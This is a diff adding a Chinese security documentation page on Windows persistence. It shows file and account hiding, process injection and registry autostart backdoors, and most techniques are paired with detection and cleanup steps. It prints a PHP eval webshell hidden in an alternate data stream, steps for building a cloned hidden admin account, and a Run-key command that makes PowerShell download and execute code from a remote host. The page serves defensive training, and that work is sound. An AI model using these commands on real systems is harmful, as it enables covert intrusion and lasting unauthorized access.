@@ -1,0 +1,1909 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.2.3, mkdocs-material-8.1.8">
+    
+    
+      
+        <title>权限维持 - klsfct Docs</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.6e60f8b8.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.e6a45f82.min.css">
+        
+          
+          
+          <meta name="theme-color" content="#000000">
+        
+      
+    
+    
+    
+      
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,400,400i,700%7CRoboto+Mono&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../js/stylesheets/extra.css">
+    
+    <script>__md_scope=new URL("../..",location),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="" data-md-color-primary="black" data-md-color-accent="deep-orange">
+  
+    
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#1windows-" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../.." title="klsfct Docs" class="md-header__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            klsfct Docs
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              权限维持
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="清空当前内容" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-tabs__inner md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+
+
+  <li class="md-tabs__item">
+    <a href="../.." class="md-tabs__link">
+      主页
+    </a>
+  </li>
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        红队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-tabs__link">
+        蓝队
+      </a>
+    </li>
+  
+
+      
+        
+  
+  
+
+
+  
+  
+  
+    <li class="md-tabs__item">
+      <a href="../../about/aboutme/" class="md-tabs__link">
+        About
+      </a>
+    </li>
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="klsfct Docs" class="md-nav__button md-logo" aria-label="klsfct Docs" data-md-component="logo">
+      
+  <img src="../../images/logo.jpg" alt="logo">
+
+    </a>
+    klsfct Docs
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        主页
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_2" data-md-state="indeterminate" type="checkbox" id="__nav_2" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_2">
+          红队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="红队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_2">
+          <span class="md-nav__icon md-icon"></span>
+          红队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../redteam/%E7%BA%A2%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../redteam/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-nav__link">
+        信息收集
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/" class="md-nav__link">
+        漏洞库
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../redteam/%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="md-nav__link">
+        溯源分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../redteam/%E9%92%93%E9%B1%BC/" class="md-nav__link">
+        钓鱼
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_3" data-md-state="indeterminate" type="checkbox" id="__nav_3" checked>
+      
+      
+      
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_3">
+          蓝队
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="蓝队" data-md-level="1">
+        <label class="md-nav__title" for="__nav_3">
+          <span class="md-nav__icon md-icon"></span>
+          蓝队
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E8%93%9D%E9%98%9F%E7%9B%AE%E5%BD%95/" class="md-nav__link">
+        目录
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="md-nav__link">
+        应急响应
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/" class="md-nav__link">
+        日志分析
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../window实战.md" class="md-nav__link">
+        window实战
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../redteam/linux实战.md" class="md-nav__link">
+        linux实战
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../redteam/web实战.md" class="md-nav__link">
+        web实战
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_4" data-md-state="indeterminate" type="checkbox" id="__nav_4" checked>
+      
+      
+      
+        
+          
+        
+      
+      
+        <label class="md-nav__link" for="__nav_4">
+          About
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="About" data-md-level="1">
+        <label class="md-nav__title" for="__nav_4">
+          <span class="md-nav__icon md-icon"></span>
+          About
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../about/aboutme/" class="md-nav__link">
+        about me
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="目录">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      目录
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#1windows-" class="md-nav__link">
+    第1篇：Windows权限维持--隐藏篇
+  </a>
+  
+    <nav class="md-nav" aria-label="第1篇：Windows权限维持--隐藏篇">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0x00" class="md-nav__link">
+    0x00 前言
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x01" class="md-nav__link">
+    0x01 隐藏文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x02" class="md-nav__link">
+    0x02 隐藏账号
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x03" class="md-nav__link">
+    0x03 端口复用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x04" class="md-nav__link">
+    0x04 进程注入
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x05" class="md-nav__link">
+    0x05 结束
+  </a>
+  
+    <nav class="md-nav" aria-label="0x05 结束">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#cymothoa" class="md-nav__link">
+    Cymothoa
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#metasploit-dll" class="md-nav__link">
+    Metasploit注入 dll
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2windows-" class="md-nav__link">
+    第2篇：Windows权限维持--后门篇
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3linux-" class="md-nav__link">
+    第3篇：Linux权限维持--隐藏篇
+  </a>
+  
+    <nav class="md-nav" aria-label="第3篇：Linux权限维持--隐藏篇">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0x00_1" class="md-nav__link">
+    0x00 前言
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x01_1" class="md-nav__link">
+    0x01 隐藏文件
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x02_1" class="md-nav__link">
+    0x02 隐藏文件时间戳
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x03_1" class="md-nav__link">
+    0x03 隐藏权限
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x04_1" class="md-nav__link">
+    0x04 隐藏历史操作命令
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x05-ssh" class="md-nav__link">
+    0x05 隐藏远程SSH登陆记录
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x06" class="md-nav__link">
+    0x06 端口复用
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x07" class="md-nav__link">
+    0x07 进程隐藏
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x07_1" class="md-nav__link">
+    0x07 结语
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4linux-" class="md-nav__link">
+    第4篇：Linux权限维持--后门篇
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5windows" class="md-nav__link">
+    第5篇：Windows命令行文件下载方式汇总
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#6" class="md-nav__link">
+    第6篇：三大渗透测试框架权限维持技术
+  </a>
+  
+    <nav class="md-nav" aria-label="第6篇：三大渗透测试框架权限维持技术">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#0x00_2" class="md-nav__link">
+    0x00 前言
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x01-msf" class="md-nav__link">
+    0x01 MSF权限维持
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x02-empire" class="md-nav__link">
+    0x02 Empire 权限维持
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x03-cobalt-strike" class="md-nav__link">
+    0x03 Cobalt Strike权限维持
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#0x04_2" class="md-nav__link">
+    0x04 结束语
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#7webshell" class="md-nav__link">
+    第7篇：常见WebShell管理工具
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content" data-md-component="content">
+            <article class="md-content__inner md-typeset">
+              
+                
+
+  <h1>权限维持</h1>
+
+<h2 id="1windows-">第1篇：Windows权限维持--隐藏篇<a class="headerlink" href="#1windows-" title="Permanent link">&para;</a></h2>
+<h3 id="0x00">0x00 前言<a class="headerlink" href="#0x00" title="Permanent link">&para;</a></h3>
+<p>攻击者在获取服务器权限后，通常会用一些后门来维持权限，如果你想让你的后门保持的更久些，那么请隐藏好它，使之不易被管理员发现。</p>
+<h3 id="0x01">0x01 隐藏文件<a class="headerlink" href="#0x01" title="Permanent link">&para;</a></h3>
+<p><strong>1、利用文件属性</strong></p>
+<p>最简单的一种隐藏文件的方式，文件右键属性，勾选隐藏，点击确定后，在这个文件里看不到刚刚的文件了。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-1.png" /></p>
+<p>如果要让文件显示出来，就点击查看，勾选显示隐藏的文件，文件就显示出来。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-2.png" /></p>
+<p>如何真正隐藏文件？</p>
+<p>使用Attrib +s +a +h +r命令就是把原本的文件夹增加了系统文件属性、存档文件属性、只读文件属性和隐藏文件属性。</p>
+<p><code>attrib +s +a +h +r D:\test\project\test</code>.txt</p>
+<p>这样就做到了真正的隐藏，不管你是否显示隐藏文件，此文件夹都看不见。</p>
+<p>破解隐藏文件：</p>
+<p>打开电脑文件夹选项卡，取消”隐藏受保护的操作系统文件“勾选，把”隐藏文件和文件夹“下面的单选选择“显示隐藏的文件、文件夹和驱动器”。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-3.png" /></p>
+<p><strong>2、利用ADS隐藏文件内容</strong></p>
+<p>在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞： 　</p>
+<div class="highlight"><pre><span></span><code>echo ^&lt;?php @eval($_POST[&#39;chopper&#39;]);?^&gt; &gt; index.php:hidden.jpg
+</code></pre></div>
+<p>这样子就生成了一个不可见的shell hidden.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个hidden.jpg的。　</p>
+<div class="highlight"><pre><span></span><code>问题1：如何查看index.php:hidden.jpg内容呢？
+
+　　    进入文件所在目录，notepad index.php:hidden.jpg    或者 dir /r
+　　    
+问题2：如何删除index.php:hidden.jpg？
+
+     直接删除index.php即可
+</code></pre></div>
+<p><strong>3、驱动级文件隐藏</strong></p>
+<p>驱动隐藏我们可以用过一些软件来实现，软件名字叫：Easy File Locker</p>
+<p>下载链接： <a href="http://www.xoslab.com/efl.html">http://www.xoslab.com/efl.html</a></p>
+<p>如果你在网站目录未查找到相关文件，且系统目录存在存在以下文件：</p>
+<div class="highlight"><pre><span></span><code>c:\WINDOWS\xlkfs.dat
+c:\WINDOWS\xlkfs.dll
+c:\WINDOWS\xlkfs.ini
+c:\WINDOWS\system32\drivers\xlkfs.sys
+</code></pre></div>
+<p>那么你，应该是遭遇了驱动级文件隐藏。</p>
+<p>如何清除？</p>
+<div class="highlight"><pre><span></span><code>1、查询服务状态： sc qc xlkfs
+2、停止服务： net stop xlkfs 服务停止以后，经驱动级隐藏的文件即可显现
+3、删除服务： sc delete xlkfs
+4、删除系统目录下面的文件，重启系统，确认服务已经被清理了。
+</code></pre></div>
+<p>隐藏文件的方式还有很多，比如伪装成一个系统文件夹图标，利用畸形文件名、保留文件名无法删除，甚至取一个与系统文件很像的文件名并放在正常目录里面，很难辨别出来。</p>
+<p>这些隐藏文件的方式早已不再是秘密，而更多的恶意程序开始实现“无文件”攻击，这种方式极难被发现。</p>
+<h3 id="0x02">0x02 隐藏账号<a class="headerlink" href="#0x02" title="Permanent link">&para;</a></h3>
+<p>window 隐藏系统用户操作，CMD命令行下，建立了一个用户名为“test$”，密码为“abc123!”的简单隐藏账户,并且把该隐藏账户提升为了管理员权限。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-4.png" /></p>
+<p>PS:CMD命令行使用"net user",看不到"test$"这个账号，但在控制面板和本地用户和组是可以显示此用户的。</p>
+<p>克隆账号制作过程：</p>
+<p>1、“开始”→“运行”，输入“regedt32.exe”后回车,需要到“HKEY_LOCAL_MACHINE\SAM\SAM”，单机右建权限，把名叫：administrator的用户给予：完全控制以及读取的权限，在后面打勾就行，然后关闭注册表编辑器，再次打开即可。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-5.png" /></p>
+<p>2、来到注册表编辑器的“HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names”处，点击test$用户，得到在右边显示的键值中的“类型”一项显示为0x3ec，找到箭头所指目录。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-6.png" /></p>
+<p>3、找到administrator所对应的的项为“000001F4”，将“000001F4”的F值复制到“000003EC”的F值中，保存。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-7.png" /></p>
+<p>4、分别test<span class="arithmatex"><span class="MathJax_Preview">和“000003EC导出到桌面，删除test</span><script type="math/tex">和“000003EC导出到桌面，删除test</script></span>用户 net user test$ /del</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-8.png" /></p>
+<p>5、将刚才导出的两个后缀为.reg的注册表项导入注册表中。这样所谓的隐藏账户就创建好了。PS：不管你是在命令提示符下输入net user 或者在系统用户管理界面都是看不到test$这个账户的，只有在注册表中才能看得到。</p>
+<p>检测和清理方法：</p>
+<p>使用D盾_web查杀工具，使用克隆账号检测功能进行查看，可检测出隐藏、克隆账号。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-9.png" /></p>
+<h3 id="0x03">0x03 端口复用<a class="headerlink" href="#0x03" title="Permanent link">&para;</a></h3>
+<p>通过端口复用来达到隐藏端口的目的，在Window下，如何实现端口复用呢？</p>
+<p>前阵子，@Twi1ight公布了一种基于内置系统服务的端口复用后门方法，利用WinRM服务，一条命令实现端口复用后门：</p>
+<div class="highlight"><pre><span></span><code>winrm set winrm/config/service @{EnableCompatibilityHttpListener=&quot;true&quot;}
+</code></pre></div>
+<p>一般开启WinRM服务作为远程管理，但还是第一次听到可以作为端口复用，一种简单容易实现的端口复用方式。假设，攻击者已获取到administrator账号密码，连接远程WinRM服务执行命令：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-19.png" /></p>
+<p>当执行这条命令的同时，将在安全日志中留下痕迹，</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-20.png" /></p>
+<p>另外，可以通过代码实现端口复用重定向，工具：<a href="https://github.com/crabkun/Switcher">https://github.com/crabkun/Switcher</a></p>
+<h3 id="0x04">0x04 进程注入<a class="headerlink" href="#0x04" title="Permanent link">&para;</a></h3>
+<p>进程注入，一直是病毒木马的惯用手段，同时，它也是一种隐藏技术。在常见的渗透测试框架中，进程注入是怎么做的以及我们如何通过工具排查出来？</p>
+<p><strong>1、meterpreter会话注入</strong></p>
+<p>当前权限无法获取hash值，查看目前系统进程</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-10.png" /></p>
+<p>通过migrate将进程注入到system进程后，成功获得hash值。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-11.png" /></p>
+<p>Window后门排查：</p>
+<p>通过TCPview显示已建立的TCP连接，我们可以看到异常的连接，同时，恶意软件将以绿色显示不到一秒钟，然后变成红色消失，如此循环。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-12.png" /></p>
+<p><strong>2、Empire会话进程注入</strong></p>
+<p>通过psinject模块进行会话注入，直接输入ps选择一个SYSTEM权限的进程PID，使用进程注入模块，来获取权限。如下图：</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-13.png" /></p>
+<p>Window后门排查：利用process monitor或者火绒剑监控进程都可以定位到注入进程。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-14.png" /></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-15.png" /></p>
+<p><strong>3、Cobalt Strike进程注入</strong></p>
+<p>选择进程，点击inject，随后选择监听器，点击choose，即可发现Cobaltstrike弹回了目标机的一个新会话，这个会话就是成功注入到某进程的beacon。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-16.png" /></p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-17.png" /></p>
+<p>Window后门排查：利用process monitor捕捉通信过程，有规律的请求取决于sleep设置的间隔。</p>
+<p><img alt="img" src="https://bypass007.github.io/Emergency-Response-Notes/privilege/image/privilege-1-18.png" /></p>
+<h3 id="0x05">0x05 结束<a class="headerlink" href="#0x05" title="Permanent link">&para;</a></h3>
+<p>本文主要介绍了Window下的几种隐藏技术，包括隐藏文件、隐藏账号、端口复用、进程注入等方面的简单实现及其排查技巧。仅作抛砖引玉之用，欢迎留言分享。</p>
+<p>参考链接：</p>
+<p>Canisrufus:一款基于Python的Windows隐藏后门</p>
+<p><a href="https://github.com/maldevel/canisrufus">https://github.com/maldevel/canisrufus</a></p>
+<p>windows常见backdoor、权限维持方法及排查技术</p>
+<p><a href="https://xz.aliyun.com/t/4842">https://xz.aliyun.com/t/4842</a></p>
+<p>TALES OF A BLUE TEAMER: DETECTING POWERSHELL EMPIRE SHENANIGANS WITH SYSINTERNALS</p>
+<p><a href="https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/">https://holdmybeersecurity.com/2019/02/27/sysinternals-for-windows-incident-response/</a></p>
+<p>Hide Toolz 进程隐藏工具</p>
+<p>官网地址:<a href="https://www.hidetoolz.com/">https://www.hidetoolz.com/</a></p>
+<p>HideToolz是一款简单小巧的软件，可以隐藏进程，一键隐藏你想隐藏的程序</p>
+<h4 id="cymothoa">Cymothoa<a class="headerlink" href="#cymothoa" title="Permanent link">&para;</a></h4>
+<p>注入工具</p>
+<p>cs 进程注入</p>
+<p><a href="https://bbs.ichunqiu.com/thread-53003-1-1.html">https://bbs.ichunqiu.com/thread-53003-1-1.html</a></p>
+<h3 id="metasploit-dll">Metasploit注入 dll<a class="headerlink" href="#metasploit-dll" title="Permanent link">&para;</a></h3>
+<p><a href="https://blog.csdn.net/Fly_hps/article/details/80427707">https://blog.csdn.net/Fly_hps/article/details/80427707</a></p>
+<p>几种后门和权限维持技术外还有像是dll劫持、一些软件的插件后门、office后门等。</p>
+<p><a href="https://blog.csdn.net/qq_33020901/article/details/89504902">https://blog.csdn.net/qq_33020901/article/details/89504902</a></p>
+<h2 id="2windows-">第2篇：Windows权限维持--后门篇<a class="headerlink" href="#2windows-" title="Permanent link">&para;</a></h2>
+<p>关键词：Windows系统后门、权限维持</p>
+<p>在获取服务器权限后，通常会用一些后门技术来维持服务器权限，服务器一旦被植入后门，攻击者便如入无人之境。本文将对常见的window服务端自启动后门技术进行解析，知己知彼方能杜绝后门。</p>
+<p><strong>0x01 注册表自启动</strong></p>
+<p>通过修改注册表自启动键值，添加一个木马程序路径，实现开机自启动。</p>
+<p>常用的注册表启动键：</p>
+<div class="highlight"><pre><span></span><code># Run键 
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+# Winlogon\Userinit键
+HKEY_CURRENT_USER\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\WindowsNT\CurrentVersion\Winlogon
+
+类似的还有很多,关键词：注册表启动键值。
+</code></pre></div>
+<p>使用以下命令可以一键实现无文件注册表后门：</p>
+<div class="highlight"><pre><span></span><code>reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v &quot;Keyname&quot; /t REG_SZ /d &quot;C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -nop -w hidden -c \&quot;IEX ((new-object net.webclient).downloadstring(&#39;http://192.168.28.142:8888/logo.gif&#39;))\&quot;&quot; /f
+</code></pre></div>
+<p><strong>Logon Scripts 后门</strong></p>
+<p>注册表路径：HKEY_CURRENT_USER\Environment\</p>
+<p>创建字符串键值： UserInitMprLogonScript，键值设置为bat的绝对路径：<code>c:\test.bat</code></p>
+<p><strong>userinit后门</strong></p>
+<p>在用户进行登陆时，winlogon运行指定的程序。根据官方文档,可以更改它的值来添加与删除程序。</p>
+<p>利用USERINIT注册表键实现无文件后门：</p>
